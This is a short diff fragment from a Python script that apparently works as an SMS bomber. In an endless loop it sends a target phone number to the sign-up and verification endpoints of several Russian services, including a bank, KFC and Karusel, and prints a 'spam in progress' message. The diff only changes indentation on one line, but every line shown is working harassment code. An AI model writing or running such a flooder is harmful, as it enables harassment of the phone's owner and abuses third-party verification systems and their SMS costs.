@@ -70,7 +70,7 @@ while True:
 	requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
 	print('\033[FИдет процесс спама /           ')
 	requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
- 	print('\033[FИдет процесс спама ——           ')
+	print('\033[FИдет процесс спама ——           ')
 	requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
 	requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
 	print('\033[FИдет процесс спама \           ')
